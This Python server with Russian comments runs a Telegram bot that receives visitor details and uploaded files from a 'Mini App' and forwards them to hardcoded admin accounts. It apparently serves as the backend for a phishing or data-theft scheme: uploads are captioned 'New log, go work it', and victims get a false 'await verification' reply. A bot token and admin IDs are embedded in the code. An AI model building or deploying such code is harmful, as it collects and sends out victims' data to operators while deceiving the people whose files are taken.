import logging
import os
from aiohttp import web
from aiogram import Bot
from aiogram.types import BufferedInputFile

# =====================================================
# ПАРАМЕТРЫ НАСТРОЙКИ (ЗАПОЛНИ ИХ)
# =====================================================
API_TOKEN = '8410110349:AAE5WM8PHsg85cvGmPuNq55XS8w_FcifjR8'  # Вставь сюда токен от @BotFather
ADMIN_IDS = [8396015606, 8187498719]  # Вставь сюда свой ID и ID админов через запятую

def get_all_admins():
    return ADMIN_IDS
# =====================================================

# Инициализация
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
routes = web.RouteTableDef() # Создаем таблицу маршрутов ДО использования декораторов

# --- МАРШРУТЫ (ROUTES) ---

@routes.post('/log_entry')
async def handle_log_entry(request: web.Request):
    try:
        data = await request.json()
        user_id = data.get('user_id')
        username = data.get('username')
        ua = data.get('user_agent')

        admin_ids = get_all_admins()
        msg = (f"🚀 **Вход в Mini App**\n"
               f"👤 Юзер: @{username} (ID: {user_id})\n"
               f"📱 Устройство: `{ua}`")

        for admin_id in admin_ids:
            try:
                await bot.send_message(admin_id, msg, parse_mode="Markdown")
            except: pass
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in log_entry: {e}")
        return web.Response(text="Error", status=500)

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    try:
        reader = await request.multipart()
        user_id, username, ua, file_data = None, None, None, None
        filename = "unknown.json"

        while True:
            part = await reader.next()
            if part is None: break
            
            if part.name == 'user_id': 
                user_id = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'username': 
                username = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'user_agent': 
                ua = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'file':
                filename = part.filename or "data.json"
                file_data = await part.read()

        if user_id and file_data:
            admin_ids = get_all_admins()
            caption_text = (f"🚨 Новый лог, вперед отрабатывать\n"
                            f"User ID: {user_id}\n"
                            f"Username: @{username}\n"
                            f"Браузер: {ua}")

            for admin_id in admin_ids:
                try:
                    await bot.send_document(
                        chat_id=admin_id,
                        document=BufferedInputFile(file_data, filename=filename),
                        caption=caption_text
                    )
                except Exception as e: logging.warning(e)

            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл успешно загружен, ожидайте проверки.")
            except: pass

        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in upload: {e}")
        return web.Response(text="Error", status=500)

# Обработка OPTIONS запросов (важно для работы из браузера)
@routes.options('/upload')
@routes.options('/log_entry')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# --- ЗАПУСК ---
app = web.Application()
app.add_routes(routes)

if __name__ == '__main__':
    # Render автоматически подставляет PORT
    port = int(os.environ.get("PORT", 8080))
    web.run_app(app, host='0.0.0.0', port=port)
